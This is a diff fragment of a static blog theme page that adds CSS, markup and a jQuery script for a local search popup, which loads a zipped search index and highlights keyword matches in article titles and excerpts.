+  border-radius: 5px;
+  overflow: scroll;
+}
+#local-search-input {
+  width: 100%;
+  border: none;
+  outline: none;
+  border-bottom: 1px solid #151515;
+  background-color: initial;
+}
+.search-result-list {
+  list-style: none;
+  padding-left: 0;
+}
+.search-result-list > li {
+  margin-top: 15px;
+  border-bottom: 1px solid #ddd;
+  transition: all ease .3s;
+}
+.search-result-list > li:hover {
+  border-bottom: 1px solid gray;
+}
+.search-result-title {
+  font-size: 16px;
+}
+.search-result {
+  line-height: 20px;
+}
+.search-keyword {
+  font-weight: normal;
+  color: #c00;
+}
+
+@media (min-width: 890px) {
+  .popup-btn-close {
+    position: absolute;
+    top: 15px;
+    left: 35px;
+    border: 1px solid #151515;
+    padding: 0px 10px;
+    border-top-left-radius: 8px;
+    cursor: pointer;
+    transition: all ease .3s;
+  }
+  .popup-btn-close:hover {
+    background: #151515;
+    opacity: .9;
+    color: #fff;
+  }
+}
+@media (max-width: 890px) {
+  .popup-btn-close {
+    font-size: 0;
+    position: fixed;
+    right: 20px;
+    bottom: 50px;
+    width: 50px;
+    height: 50px;
+    background: #fff;
+    border-radius: 50%;
+    box-shadow: 1px 1px 5px #888;
+    cursor: pointer;
+  }
+  .popup-btn-close::after {
+    content: '←';
+    color: #151515;
+    position: absolute;
+    top: 0;
+    left: 0;
+    font-size: 20px;
+    width: 100%;
+    height: 100%;
+    line-height: 50px;
+    text-align: center;
+  }
+}
+</style>
+
+<div class="popup search-popup local-search-popup">
+  <span class="popup-btn-close">
+    ESC
+  </span>
+  <div class="container">
+    <div class="col-md-8 col-md-offset-2">
+      <div class="local-search-header clearfix">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+          <input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+        </div>
+      </div>
+      <div id="local-search-result"></div>
+    </div>
+  </div>
+</div>
+
+<script src="/js/ziploader.js"></script>
+
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.json";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').fadeOut(300);
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $('.popup').fadeIn(300);
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // get search zip version
+    $.get('/searchVersion.txt?t=' + (+new Date()), function(res) {
+      if (localStorage.getItem('searchVersion') !== res) {
+        localStorage.setItem('searchVersion', res);
+        initSearchJson();
+      }
+    });
+
+    function initSearchJson () {
+      initLoad(['/search.zip'], {
+        loadOptions: {
+          success: function(obj) {
+            localStorage.setItem('searchJson', obj['search.json'])
+          },
+          error: function(e) {
+            return console.log(e)
+          }
+        },
+        returnOptions: {
+          'json': TYPE_TEXT
+        },
+        mimeOptions:{
+          'json':'application/json'
+        }
+      })
+    }
+
+
+    // search function;
+    var searchFunc = function(search_id, content_id) {
+      'use strict';
+
+      isfetched = true;
+      var datas = JSON.parse(localStorage.getItem('searchJson'));
+      console.log(search_id)
+      var input = document.getElementById(search_id);
+      var resultContent = document.getElementById(content_id);
+      var inputEventFunction = function() {
+        var searchText = input.value.trim().toLowerCase();
+        var keywords = searchText.split(/[\s\-]+/);
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        var resultItems = [];
+        if (searchText.length > 0) {
+          // perform local searching
+          datas.forEach(function(data) {
+            var isMatch = false;
+            var hitCount = 0;
+            var searchTextCount = 0;
+            var title = data.title ? data.title.trim() : '';
+            var titleInLowerCase = title.toLowerCase();
+            var content = data.content ? data.content.trim().replace(/<[^>]+>/g,"") : '';
+            var contentInLowerCase = content.toLowerCase();
+            var articleUrl = decodeURIComponent(data.url);
+            var indexOfTitle = [];
+            var indexOfContent = [];
+            // only match articles with not empty titles
+            keywords.forEach(function(keyword) {
+              function getIndexByWord(word, text, caseSensitive) {
+                var wordLen = word.length;
+                if (wordLen === 0) {
+                  return [];
+                }
+                var startPosition = 0, position = [], index = [];
+                if (!caseSensitive) {
+                  text = text.toLowerCase();
+                  word = word.toLowerCase();
+                }
+                while ((position = text.indexOf(word, startPosition)) > -1) {
+                  index.push({position: position, word: word});
+                  startPosition = position + wordLen;
+                }
+                return index;
+              }
+
+              indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+              indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+            });
+            if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+              isMatch = true;
+              hitCount = indexOfTitle.length + indexOfContent.length;
+            }
+
+            // show search results
+
+            if (isMatch) {
+              // sort index by position of keyword
+
+              [indexOfTitle, indexOfContent].forEach(function (index) {
+                index.sort(function (itemLeft, itemRight) {
+                  if (itemRight.position !== itemLeft.position) {
+                    return itemRight.position - itemLeft.position;
+                  } else {
+                    return itemLeft.word.length - itemRight.word.length;
+                  }
+                });
+              });
+
+              // merge hits into slices
+
+              function mergeIntoSlice(text, start, end, index) {
+                var item = index[index.length - 1];
+                var position = item.position;
+                var word = item.word;
+                var hits = [];
+                var searchTextCountInSlice = 0;
+                while (position + word.length <= end && index.length != 0) {
+                  if (word === searchText) {
+                    searchTextCountInSlice++;
+                  }
+                  hits.push({position: position, length: word.length});
+                  var wordEnd = position + word.length;
+
+                  // move to next position of hit
+
+                  index.pop();
+                  while (index.length != 0) {
+                    item = index[index.length - 1];
+                    position = item.position;
+                    word = item.word;
+                    if (wordEnd > position) {
+                      index.pop();
+                    } else {
+                      break;
+                    }
+                  }
+                }
+                searchTextCount += searchTextCountInSlice;
+                return {
+                  hits: hits,
+                  start: start,
+                  end: end,
+                  searchTextCount: searchTextCountInSlice
+                };
+              }
+
+              var slicesOfTitle = [];
+              if (indexOfTitle.length != 0) {
+                slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+              }
+
+              var slicesOfContent = [];
+              while (indexOfContent.length != 0) {
+                var item = indexOfContent[indexOfContent.length - 1];
+                var position = item.position;
+                var word = item.word;
+                // cut out 100 characters
+                var start = position - 20;
+                var end = position + 80;
+                if(start < 0){
+                  start = 0;
+                }
+                if (end < position + word.length) {
+                  end = position + word.length;
+                }
+                if(end > content.length){
+                  end = content.length;
+                }
+                slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+              }
+
+              // sort slices in content by search text's count and hits' count
+
+              slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                  return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                  return sliceRight.hits.length - sliceLeft.hits.length;
+                } else {
+                  return sliceLeft.start - sliceRight.start;
+                }
+              });
+
+              // select top N slices in content
+
+              var upperBound = parseInt('2');
+              if (upperBound >= 0) {
+                slicesOfContent = slicesOfContent.slice(0, upperBound);
+              }
+
+              // highlight title and content
+
+              function highlightKeyword(text, slice) {
+                var result = '';
+                var prevEnd = slice.start;
+                slice.hits.forEach(function (hit) {
+                  result += text.substring(prevEnd, hit.position);
+                  var end = hit.position + hit.length;
+                  result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                  prevEnd = end;
+                });
+                result += text.substring(prevEnd, slice.end);
+                return result;
+              }
+
+              var resultItem = '';
+
+              if (slicesOfTitle.length != 0) {
+                resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+              } else {
+                resultItem += "<li><a target='_blank' href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+              }
+
+              slicesOfContent.forEach(function (slice) {
+                resultItem += "<a target='_blank' href='" + articleUrl + "'>" +
+                  "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                  "...</p>" + "</a>";
+              });
+
+              resultItem += "</li>";
+              resultItems.push({
+                item: resultItem,
+                searchTextCount: searchTextCount,
+                hitCount: hitCount,
+                id: resultItems.length
+              });
+            }
+          })
+        };
+        if (keywords.length === 1 && keywords[0] === "") {
+          resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+        } else if (resultItems.length === 0) {
+          resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+        } else {
+          resultItems.sort(function (resultLeft, resultRight) {
+            if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+              return resultRight.searchTextCount - resultLeft.searchTextCount;
+            } else if (resultLeft.hitCount !== resultRight.hitCount) {
+              return resultRight.hitCount - resultLeft.hitCount;
+            } else {
+              return resultRight.id - resultLeft.id;
+            }
+          });
+          var searchResultList = '<ul class=\"search-result-list\">';
+          resultItems.forEach(function (result) {
+            searchResultList += result.item;
+          })
+          searchResultList += "</ul>";
+          resultContent.innerHTML = searchResultList;
+        }
+      }
+
+      if ('auto' === 'auto') {
+        input.addEventListener('input', inputEventFunction);
+      } else {
+        $('.search-icon').click(inputEventFunction);
+        input.addEventListener('keypress', function (event) {
+          if (event.keyCode === 13) {
+            inputEventFunction();
+          }
+        });
+      }
+
+      // remove loading animation
+      $('body').css('overflow', '');
+
+      proceedsearch();
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        $('.sb-close').click();
+        searchFunc('local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+      
+      
+
+<!--
+
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<meting-js
+      server="netease"
+      type="playlist"
+      id="4904272454">
+</meting-js>
+-->
+
+</body>
+
+</html>
+
+
+
+
+
+
+
